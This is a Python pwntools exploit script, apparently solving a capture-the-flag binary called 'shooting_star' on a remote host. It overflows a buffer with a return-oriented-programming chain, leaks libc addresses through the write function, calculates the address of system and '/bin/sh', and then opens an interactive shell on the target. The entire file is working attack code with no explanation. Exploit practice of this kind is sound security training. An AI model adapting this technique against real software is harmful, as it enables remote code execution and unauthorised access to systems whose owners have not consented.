#!/usr/bin/env python3


from pwn import *
from pwnc.pwnc import get_libc
import time

BINARY = "./shooting_star"
LIBC = "./libc.so.6"
ADDR = "138.68.168.137"
PORT = 30708

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)


class Gadgets:
    pop_rdi_ret = 0x4012cb
    pop_rsi_pop_r15_ret = 0x4012c9


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    io.sendlineafter(b"> ", "1")
    payload = [
        cyclic(cyclic_find(0x616161616161616a, n=8), n=8),
        Gadgets.pop_rdi_ret,
        0x1,
        Gadgets.pop_rsi_pop_r15_ret,
        elf.got.write,
        0x0,
        elf.plt.write,
        elf.sym.main,
    ]
    io.sendlineafter(">> ", flat(payload))
    io.recvuntil("May your wish come true!\n")

    write_leak = io.recvn(8)
    write_leak = u64(write_leak.ljust(8, b"\x00"))
    log.success(f"write found @: {hex(write_leak)}")
    read_leak = io.recvn(8)
    read_leak = u64(read_leak.ljust(8, b"\x00"))
    log.success(f"read found @: {hex(read_leak)}")
    setvbuf_leak = io.recvn(8)
    setvbuf_leak = u64(setvbuf_leak.ljust(8, b"\x00"))
    log.success(f"setvbuf found @: {hex(setvbuf_leak)}")
    libc.address = write_leak - libc.sym.write
    log.success(f"libc found @: {hex(libc.address)}")
    log.success(f"system found @: {hex(libc.sym.system)}")
    bin_sh = next(libc.search(b'/bin/sh\x00'))
    log.success(f"/bin/sh found @: {hex(bin_sh)}")

    io.sendlineafter(b"> ", "1")
    payload = [
        cyclic(cyclic_find(0x616161616161616a, n=8), n=8),
        Gadgets.pop_rdi_ret,
        bin_sh,
        libc.sym.system,
    ]
    io.sendlineafter(">> ", flat(payload))

    io.interactive()


if __name__ == "__main__":
    solve()
